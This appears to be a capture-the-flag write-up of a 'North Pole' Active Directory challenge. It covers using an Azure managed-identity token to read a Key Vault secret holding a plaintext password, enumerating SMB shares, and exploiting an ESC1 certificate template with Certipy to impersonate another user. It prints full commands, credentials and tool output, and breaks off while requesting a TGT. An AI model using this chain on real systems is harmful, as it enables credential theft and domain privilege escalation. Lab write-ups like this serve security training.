<p><div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;access_token&quot;</span><span class="p">:</span><span class="s2">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDQyNzUzNDcsIm5iZiI6MTcwNDI3NTM0NywiZXhwIjoxNzA0MzYyMDQ3LCJhaW8iOiJFMlZnWVBnakZCYjZ1UHdXNC8xYkNuV1dqejZvQXdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoiMTNGSnVnbFVqa3liQVNUT19CU1hCdyIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.QsuW5bW7bm_aEf7TRy37kry8depqvfpW8s0g8c-dj8r9KvgLeL2hhdeeC9Bwziy8VvPAIcDHC00Z5MENcMRJa6DQ6fk_Nxs2kK16JOa2I5O3bmIcr5AkY6srPB1ZQlsw8ZtwU_VZ4j6gatlRTVSHtzJwhdjGxrxxb1DdotXvmm4eUDV8z4goorZiowUshdwImA-ppygH6Df1IHwtNyFlIDKgBGi_p5HfKdocPWr9UI4lCSJNEzgdlxrlStRnYeI0FTahcpeP5NxtWScLzK0OuYeCvo6wDxuwCWQGKbRsEjKzhIxUD92J9eWifgtP94I9gsc0_6Izmqk9-hvaC35xtA&quot;</span><span class="p">,</span><span class="nt">&quot;client_id&quot;</span><span class="p">:</span><span class="s2">&quot;b84e06d3-aba1-4bcc-9626-2e0d76cba2ce&quot;</span><span class="p">,</span><span class="nt">&quot;expires_in&quot;</span><span class="p">:</span><span class="s2">&quot;85662&quot;</span><span class="p">,</span><span class="nt">&quot;expires_on&quot;</span><span class="p">:</span><span class="s2">&quot;1704362047&quot;</span><span class="p">,</span><span class="nt">&quot;ext_expires_in&quot;</span><span class="p">:</span><span class="s2">&quot;86399&quot;</span><span class="p">,</span><span class="nt">&quot;not_before&quot;</span><span class="p">:</span><span class="s2">&quot;1704275347&quot;</span><span class="p">,</span><span class="nt">&quot;resource&quot;</span><span class="p">:</span><span class="s2">&quot;https://vault.azure.net&quot;</span><span class="p">,</span><span class="nt">&quot;token_type&quot;</span><span class="p">:</span><span class="s2">&quot;Bearer&quot;</span><span class="p">}</span>
</code></pre></div>
Let's query our secrets in vault: </p>
<p>https://learn.microsoft.com/en-us/rest/api/keyvault/secrets/get-secrets/get-secrets?view=rest-keyvault-secrets-7.4&amp;tabs=HTTP</p>
<div class="highlight"><pre><span></span><code>curl -H &quot;Authorization: Bearer [TOKEN]&quot; https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4
</code></pre></div>
<p>And we found interesting secret:</p>
<p><div class="highlight"><pre><span></span><code><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;attributes&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nt">&quot;enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;created&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1699564823</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;updated&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1699564823</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;recoveryLevel&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Recoverable+Purgeable&quot;</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;recoverableDays&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">90</span>
<span class="w">            </span><span class="p">},</span>
<span class="w">            </span><span class="nt">&quot;tags&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">],</span>
<span class="w">    </span><span class="nt">&quot;nextLink&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span>
<span class="p">}</span>
</code></pre></div>
Now let's pull our secret</p>
<p><div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer &lt;TOKEN&gt;&quot;</span><span class="w"> </span><span class="s2">&quot;https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.0&quot;</span>
</code></pre></div>
curl "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.0" -H "Authorization: Bearer <TOKEN>"
And our secret!!</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Import-Module ActiveDirectory; $UserName = \&quot;elfy\&quot;; $UserDomain = \&quot;northpole.local\&quot;; $UserUPN = \&quot;$UserName@$UserDomain\&quot;; $Password = ConvertTo-SecureString \&quot;J4`ufC49/J4766\&quot; -AsPlainText -Force; $DCIP = \&quot;10.0.0.53\&quot;; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \&quot;\&quot; -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;attributes&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nt">&quot;enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;created&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1699564823</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;updated&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1699564823</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;recoveryLevel&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Recoverable+Purgeable&quot;</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nt">&quot;tags&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span>
<span class="p">}</span>
</code></pre></div>
<p>Now let's try to use our secrets to looks around AD env</p>
<div class="highlight"><pre><span></span><code>smbclient.py<span class="w"> </span>northpole.local/elfy:<span class="s1">&#39;J4`ufC49/J4766&#39;</span>@10.0.0.53<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.53
</code></pre></div>
<p>Looking around we can see some interesting files:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># shares</span>
ADMIN$
C$
D$
FileShare
IPC$
NETLOGON
SYSVOL
<span class="c1"># use FileShare</span>
<span class="c1"># ls</span>
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Wed<span class="w"> </span>Jan<span class="w">  </span><span class="m">3</span><span class="w"> </span><span class="m">01</span>:13:58<span class="w"> </span><span class="m">2024</span><span class="w"> </span>.
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Wed<span class="w"> </span>Jan<span class="w">  </span><span class="m">3</span><span class="w"> </span><span class="m">01</span>:13:55<span class="w"> </span><span class="m">2024</span><span class="w"> </span>..
-rw-rw-rw-<span class="w">     </span><span class="m">701028</span><span class="w">  </span>Wed<span class="w"> </span>Jan<span class="w">  </span><span class="m">3</span><span class="w"> </span><span class="m">01</span>:13:58<span class="w"> </span><span class="m">2024</span><span class="w"> </span>Cookies.pdf
-rw-rw-rw-<span class="w">    </span><span class="m">1521650</span><span class="w">  </span>Wed<span class="w"> </span>Jan<span class="w">  </span><span class="m">3</span><span class="w"> </span><span class="m">01</span>:13:58<span class="w"> </span><span class="m">2024</span><span class="w"> </span>Cookies_Recipe.pdf
-rw-rw-rw-<span class="w">      </span><span class="m">54096</span><span class="w">  </span>Wed<span class="w"> </span>Jan<span class="w">  </span><span class="m">3</span><span class="w"> </span><span class="m">01</span>:13:58<span class="w"> </span><span class="m">2024</span><span class="w"> </span>SignatureCookies.pdf
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Wed<span class="w"> </span>Jan<span class="w">  </span><span class="m">3</span><span class="w"> </span><span class="m">01</span>:13:58<span class="w"> </span><span class="m">2024</span><span class="w"> </span>super_secret_research
-rw-rw-rw-<span class="w">        </span><span class="m">165</span><span class="w">  </span>Wed<span class="w"> </span>Jan<span class="w">  </span><span class="m">3</span><span class="w"> </span><span class="m">01</span>:13:58<span class="w"> </span><span class="m">2024</span><span class="w"> </span>todo.txt
<span class="c1"># cat todo.txt</span>
<span class="m">1</span>.<span class="w"> </span>Bake<span class="w"> </span>some<span class="w"> </span>cookies.
<span class="m">2</span>.<span class="w"> </span>Restrict<span class="w"> </span>access<span class="w"> </span>to<span class="w"> </span>C:<span class="se">\F</span>ileShare<span class="se">\s</span>uper_secret_research<span class="w"> </span>to<span class="w"> </span>only<span class="w"> </span>researchers<span class="w"> </span>so<span class="w"> </span>everyone<span class="w"> </span>cant<span class="w"> </span>see<span class="w"> </span>the<span class="w"> </span>folder<span class="w"> </span>or<span class="w"> </span><span class="nb">read</span><span class="w"> </span>its<span class="w"> </span>contents
<span class="m">3</span>.<span class="w"> </span>Profit
<span class="c1"># cat super_secret_research</span>
<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>SMB<span class="w"> </span>SessionError:<span class="w"> </span>STATUS_FILE_IS_A_DIRECTORY<span class="o">(</span>The<span class="w"> </span>file<span class="w"> </span>that<span class="w"> </span>was<span class="w"> </span>specified<span class="w"> </span>as<span class="w"> </span>a<span class="w"> </span>target<span class="w"> </span>is<span class="w"> </span>a<span class="w"> </span>directory,<span class="w"> </span>and<span class="w"> </span>the<span class="w"> </span><span class="nb">caller</span><span class="w"> </span>specified<span class="w"> </span>that<span class="w"> </span>it<span class="w"> </span>could<span class="w"> </span>be<span class="w"> </span>anything<span class="w"> </span>but<span class="w"> </span>a<span class="w"> </span>directory.<span class="o">)</span>
</code></pre></div>
<details class="hint">
<summary>Vulnerable Active Directory Certificate Service-Certificate Template Allows Group/User Privilege Escalation</summary>
<p><strong>Severity:</strong> High<br/>
<strong>Finding:</strong> SCS used the tool <em><a href="https://github.com/ly4k/Certipy">Certipy</a></em> to enumerate and attack Active Directory Certificate Services (AD CS). SCS ran the tool with the find -vulnerable option active. This option identifies certificate templates that allow users to supply their own subject alternative name (SAN) and determine if a client authentication extended key usage (EKU) is set. SCS identified a vulnerability within the AD CS certificate template susceptible to exploitation. This technique allowed our analysts to escalate their privileges by requesting certificates that grant access to other accounts and resources. The vulnerability exists because the AD CS template does not enforce proper authorization checks on the certificate enrollment process. Any authenticated user can request a certificate with any SAN, which can then be used for client authentication. This allowed our analysts to impersonate any user or computer in the domain, including domain administrators, and gain full control over the network.<br/>
<strong>Recommendation:</strong> SCS recommends that NPS review and modify the permissions on all AD CS certificate templates and ensure only designated security groups can enroll. It is recommended that NPS implement a tiered administration model and conduct regular permission set audits. Additionally, NPS may find the documentation provided by Microsoft and NIST for best practices to secure AD CS documentation of value. The best practices include but are not limited to: role separation, certificate validity period enforcement, compromised certificates revocation, and certificate activity monitoring.<br/>
<strong>Verification:</strong> NPS security teams can verify the remediation of this finding by running the <em>Certipy</em> tool with the find -vulnerable option active to check if any certificate templates still allow unauthorized enrollment. The NPS security team should confirm the AD CS template is no longer listed as vulnerable and that its permissions are restricted to the appropriate security groups.<br/></p>
</details>
<p>Let's audit our AD CS service.</p>
<div class="highlight"><pre><span></span><code>certipy<span class="w"> </span>find<span class="w"> </span>-vulnerable<span class="w"> </span>-u<span class="w"> </span>elfy@northpole.local<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;J4`ufC49/J4766&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.5
</code></pre></div>
<div class="highlight"><pre><span></span><code>Certipy<span class="w"> </span>v4.8.2<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Finding<span class="w"> </span>certificate<span class="w"> </span>templates
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span><span class="m">34</span><span class="w"> </span>certificate<span class="w"> </span>templates
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Finding<span class="w"> </span>certificate<span class="w"> </span>authorities
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span><span class="m">1</span><span class="w"> </span>certificate<span class="w"> </span>authority
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span><span class="m">12</span><span class="w"> </span>enabled<span class="w"> </span>certificate<span class="w"> </span>templates
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>CA<span class="w"> </span>configuration<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;northpole-npdc01-CA&#39;</span><span class="w"> </span>via<span class="w"> </span>CSRA
<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>error<span class="w"> </span><span class="k">while</span><span class="w"> </span>trying<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>CA<span class="w"> </span>configuration<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;northpole-npdc01-CA&#39;</span><span class="w"> </span>via<span class="w"> </span>CSRA:<span class="w"> </span>CASessionError:<span class="w"> </span>code:<span class="w"> </span>0x80070005<span class="w"> </span>-<span class="w"> </span>E_ACCESSDENIED<span class="w"> </span>-<span class="w"> </span>General<span class="w"> </span>access<span class="w"> </span>denied<span class="w"> </span>error.
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>CA<span class="w"> </span>configuration<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;northpole-npdc01-CA&#39;</span><span class="w"> </span>via<span class="w"> </span>RRP
<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Failed<span class="w"> </span>to<span class="w"> </span>connect<span class="w"> </span>to<span class="w"> </span>remote<span class="w"> </span>registry.<span class="w"> </span>Service<span class="w"> </span>should<span class="w"> </span>be<span class="w"> </span>starting<span class="w"> </span>now.<span class="w"> </span>Trying<span class="w"> </span>again...
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>CA<span class="w"> </span>configuration<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;northpole-npdc01-CA&#39;</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>BloodHound<span class="w"> </span>data<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;20240103104107_Certipy.zip&#39;</span>.<span class="w"> </span>Drag<span class="w"> </span>and<span class="w"> </span>drop<span class="w"> </span>the<span class="w"> </span>file<span class="w"> </span>into<span class="w"> </span>the<span class="w"> </span>BloodHound<span class="w"> </span>GUI<span class="w"> </span>from<span class="w"> </span>@ly4k
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>text<span class="w"> </span>output<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;20240103104107_Certipy.txt&#39;</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>JSON<span class="w"> </span>output<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;20240103104107_Certipy.json&#39;</span>

cat<span class="w"> </span>20240103104107_Certipy.txt
Certificate<span class="w"> </span>Authorities
<span class="w">  </span><span class="m">0</span>
<span class="w">    </span>CA<span class="w"> </span>Name<span class="w">                             </span>:<span class="w"> </span>northpole-npdc01-CA
<span class="w">    </span>DNS<span class="w"> </span>Name<span class="w">                            </span>:<span class="w"> </span>npdc01.northpole.local
<span class="w">    </span>Certificate<span class="w"> </span>Subject<span class="w">                 </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>northpole-npdc01-CA,<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>northpole,<span class="w"> </span><span class="nv">DC</span><span class="o">=</span><span class="nb">local</span>
<span class="w">    </span>Certificate<span class="w"> </span>Serial<span class="w"> </span>Number<span class="w">           </span>:<span class="w"> </span>52CE72EF7635CABF4BCC0B9C8435EF8A
<span class="w">    </span>Certificate<span class="w"> </span>Validity<span class="w"> </span>Start<span class="w">          </span>:<span class="w"> </span><span class="m">2024</span>-01-03<span class="w"> </span><span class="m">01</span>:05:50+00:00
<span class="w">    </span>Certificate<span class="w"> </span>Validity<span class="w"> </span>End<span class="w">            </span>:<span class="w"> </span><span class="m">2029</span>-01-03<span class="w"> </span><span class="m">01</span>:15:50+00:00
<span class="w">    </span>Web<span class="w"> </span>Enrollment<span class="w">                      </span>:<span class="w"> </span>Disabled
<span class="w">    </span>User<span class="w"> </span>Specified<span class="w"> </span>SAN<span class="w">                  </span>:<span class="w"> </span>Disabled
<span class="w">    </span>Request<span class="w"> </span>Disposition<span class="w">                 </span>:<span class="w"> </span>Issue
<span class="w">    </span>Enforce<span class="w"> </span>Encryption<span class="w"> </span><span class="k">for</span><span class="w"> </span>Requests<span class="w">     </span>:<span class="w"> </span>Enabled
<span class="w">    </span>Permissions
<span class="w">      </span>Owner<span class="w">                             </span>:<span class="w"> </span>NORTHPOLE.LOCAL<span class="se">\A</span>dministrators
<span class="w">      </span>Access<span class="w"> </span>Rights
<span class="w">        </span>ManageCertificates<span class="w">              </span>:<span class="w"> </span>NORTHPOLE.LOCAL<span class="se">\A</span>dministrators
<span class="w">                                          </span>NORTHPOLE.LOCAL<span class="se">\D</span>omain<span class="w"> </span>Admins
<span class="w">                                          </span>NORTHPOLE.LOCAL<span class="se">\E</span>nterprise<span class="w"> </span>Admins
<span class="w">        </span>ManageCa<span class="w">                        </span>:<span class="w"> </span>NORTHPOLE.LOCAL<span class="se">\A</span>dministrators
<span class="w">                                          </span>NORTHPOLE.LOCAL<span class="se">\D</span>omain<span class="w"> </span>Admins
<span class="w">                                          </span>NORTHPOLE.LOCAL<span class="se">\E</span>nterprise<span class="w"> </span>Admins
<span class="w">        </span>Enroll<span class="w">                          </span>:<span class="w"> </span>NORTHPOLE.LOCAL<span class="se">\A</span>uthenticated<span class="w"> </span>Users
Certificate<span class="w"> </span>Templates
<span class="w">  </span><span class="m">0</span>
<span class="w">    </span>Template<span class="w"> </span>Name<span class="w">                       </span>:<span class="w"> </span>NorthPoleUsers
<span class="w">    </span>Display<span class="w"> </span>Name<span class="w">                        </span>:<span class="w"> </span>NorthPoleUsers
<span class="w">    </span>Certificate<span class="w"> </span>Authorities<span class="w">             </span>:<span class="w"> </span>northpole-npdc01-CA
<span class="w">    </span>Enabled<span class="w">                             </span>:<span class="w"> </span>True
<span class="w">    </span>Client<span class="w"> </span>Authentication<span class="w">               </span>:<span class="w"> </span>True
<span class="w">    </span>Enrollment<span class="w"> </span>Agent<span class="w">                    </span>:<span class="w"> </span>False
<span class="w">    </span>Any<span class="w"> </span>Purpose<span class="w">                         </span>:<span class="w"> </span>False
<span class="w">    </span>Enrollee<span class="w"> </span>Supplies<span class="w"> </span>Subject<span class="w">           </span>:<span class="w"> </span>True
<span class="w">    </span>Certificate<span class="w"> </span>Name<span class="w"> </span>Flag<span class="w">               </span>:<span class="w"> </span>EnrolleeSuppliesSubject
<span class="w">    </span>Enrollment<span class="w"> </span>Flag<span class="w">                     </span>:<span class="w"> </span>PublishToDs
<span class="w">                                          </span>IncludeSymmetricAlgorithms
<span class="w">    </span>Private<span class="w"> </span>Key<span class="w"> </span>Flag<span class="w">                    </span>:<span class="w"> </span>ExportableKey
<span class="w">    </span>Extended<span class="w"> </span>Key<span class="w"> </span>Usage<span class="w">                  </span>:<span class="w"> </span>Encrypting<span class="w"> </span>File<span class="w"> </span>System
<span class="w">                                          </span>Secure<span class="w"> </span>Email
<span class="w">                                          </span>Client<span class="w"> </span>Authentication
<span class="w">    </span>Requires<span class="w"> </span>Manager<span class="w"> </span>Approval<span class="w">           </span>:<span class="w"> </span>False
<span class="w">    </span>Requires<span class="w"> </span>Key<span class="w"> </span>Archival<span class="w">               </span>:<span class="w"> </span>False
<span class="w">    </span>Authorized<span class="w"> </span>Signatures<span class="w"> </span>Required<span class="w">      </span>:<span class="w"> </span><span class="m">0</span>
<span class="w">    </span>Validity<span class="w"> </span>Period<span class="w">                     </span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>year
<span class="w">    </span>Renewal<span class="w"> </span>Period<span class="w">                      </span>:<span class="w"> </span><span class="m">6</span><span class="w"> </span>weeks
<span class="w">    </span>Minimum<span class="w"> </span>RSA<span class="w"> </span>Key<span class="w"> </span>Length<span class="w">              </span>:<span class="w"> </span><span class="m">2048</span>
<span class="w">    </span>Permissions
<span class="w">      </span>Enrollment<span class="w"> </span>Permissions
<span class="w">        </span>Enrollment<span class="w"> </span>Rights<span class="w">               </span>:<span class="w"> </span>NORTHPOLE.LOCAL<span class="se">\D</span>omain<span class="w"> </span>Admins
<span class="w">                                          </span>NORTHPOLE.LOCAL<span class="se">\D</span>omain<span class="w"> </span>Users
<span class="w">                                          </span>NORTHPOLE.LOCAL<span class="se">\E</span>nterprise<span class="w"> </span>Admins
<span class="w">      </span>Object<span class="w"> </span>Control<span class="w"> </span>Permissions
<span class="w">        </span>Owner<span class="w">                           </span>:<span class="w"> </span>NORTHPOLE.LOCAL<span class="se">\E</span>nterprise<span class="w"> </span>Admins
<span class="w">        </span>Write<span class="w"> </span>Owner<span class="w"> </span>Principals<span class="w">          </span>:<span class="w"> </span>NORTHPOLE.LOCAL<span class="se">\D</span>omain<span class="w"> </span>Admins
<span class="w">                                          </span>NORTHPOLE.LOCAL<span class="se">\E</span>nterprise<span class="w"> </span>Admins
<span class="w">        </span>Write<span class="w"> </span>Dacl<span class="w"> </span>Principals<span class="w">           </span>:<span class="w"> </span>NORTHPOLE.LOCAL<span class="se">\D</span>omain<span class="w"> </span>Admins
<span class="w">                                          </span>NORTHPOLE.LOCAL<span class="se">\E</span>nterprise<span class="w"> </span>Admins
<span class="w">        </span>Write<span class="w"> </span>Property<span class="w"> </span>Principals<span class="w">       </span>:<span class="w"> </span>NORTHPOLE.LOCAL<span class="se">\D</span>omain<span class="w"> </span>Admins
<span class="w">                                          </span>NORTHPOLE.LOCAL<span class="se">\E</span>nterprise<span class="w"> </span>Admins
<span class="w">    </span><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Vulnerabilities
<span class="w">      </span>ESC1<span class="w">                              </span>:<span class="w"> </span><span class="s1">&#39;NORTHPOLE.LOCAL\\Domain Users&#39;</span><span class="w"> </span>can<span class="w"> </span>enroll,<span class="w"> </span>enrollee<span class="w"> </span>supplies<span class="w"> </span>subject<span class="w"> </span>and<span class="w"> </span>template<span class="w"> </span>allows<span class="w"> </span>client<span class="w"> </span>authentication
</code></pre></div>
<p>So now we verified that vulnerability exist and is exploitable [!] Vulnerabilities<br/>
      ESC1  : 'NORTHPOLE.LOCAL\Domain Users' can enroll, enrollee supplies subject and template allows client authentication</p>
<p>ESC1 is when a certificate template permits Client Authentication and allows the enrollee to supply an arbitrary Subject Alternative Name (SAN).</p>
<p>On top of that we need to find user who is part of researcher team and will be able to access super secret file
<div class="highlight"><pre><span></span><code>GetADUsers.py<span class="w">  </span>-all<span class="w"> </span>northpole.local/elfy:<span class="s1">&#39;J4`ufC49/J4766&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.53
</code></pre></div></p>
<div class="highlight"><pre><span></span><code>Name<span class="w">                  </span>Email<span class="w">                           </span>PasswordLastSet<span class="w">      </span>LastLogon
--------------------<span class="w">  </span>------------------------------<span class="w">  </span>-------------------<span class="w">  </span>-------------------
alabaster<span class="w">                                             </span><span class="m">2024</span>-01-03<span class="w"> </span><span class="m">01</span>:03:30.006816<span class="w">  </span><span class="m">2024</span>-01-03<span class="w"> </span><span class="m">01</span>:16:54.252028
Guest<span class="w">                                                 </span>&lt;never&gt;<span class="w">              </span>&lt;never&gt;
krbtgt<span class="w">                                                </span><span class="m">2024</span>-01-03<span class="w"> </span><span class="m">01</span>:10:59.312257<span class="w">  </span>&lt;never&gt;
elfy<span class="w">                                                  </span><span class="m">2024</span>-01-03<span class="w"> </span><span class="m">01</span>:13:03.950311<span class="w">  </span><span class="m">2024</span>-01-03<span class="w"> </span><span class="m">10</span>:47:47.325723
wombleycube<span class="w">                                           </span><span class="m">2024</span>-01-03<span class="w"> </span><span class="m">01</span>:13:04.075313<span class="w">  </span><span class="m">2024</span>-01-03<span class="w"> </span><span class="m">10</span>:43:12.019550
</code></pre></div>
<p>Oh looks like we can try wombleycube. Let's try to request certificate</p>
<p>For ESC1, we can request a certificate based on the vulnerable certificate template and specify an arbitrary UPN or DNS SAN with the -upn and -dns parameter, respectively.</p>
<div class="highlight"><pre><span></span><code>certipy req -u &#39;elfy@northpole.local&#39;  -p &#39;J4`ufC49/J4766&#39;  -dc-ip &#39;10.0.0.53&#39;  -target &#39;npdc01.northpole.local&#39;  -ca &#39;northpole-npdc01-CA&#39; -template &#39;NorthPoleUsers&#39; -upn &#39;wombleycube@northpole.local&#39;
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Requesting<span class="w"> </span>certificate<span class="w"> </span>via<span class="w"> </span>RPC
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>requested<span class="w"> </span>certificate
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Request<span class="w"> </span>ID<span class="w"> </span>is<span class="w"> </span><span class="m">71</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>certificate<span class="w"> </span>with<span class="w"> </span>UPN<span class="w"> </span><span class="s1">&#39;wombleycube@northpole.local&#39;</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Certificate<span class="w"> </span>has<span class="w"> </span>no<span class="w"> </span>object<span class="w"> </span>SID
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>certificate<span class="w"> </span>and<span class="w"> </span>private<span class="w"> </span>key<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;wombleycube.pfx&#39;</span>
</code></pre></div>
<p>The auth command will use either the PKINIT Kerberos extension or Schannel protocol for authentication with the provided certificate. Kerberos can be used to retrieve a TGT and the NT hash for the target user, whereas Schannel will open a connection to LDAPS and drop into an interactive shell with limited LDAP commands.</p>
<div class="highlight"><pre><span></span><code>certipy auth -pfx wombleycube.pfx  -dc-ip 10.0.0.53
</code></pre></div>
<p><div class="highlight"><pre><span></span><code>Certipy<span class="w"> </span>v4.8.2<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>principal:<span class="w"> </span>wombleycube@northpole.local
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>TGT...
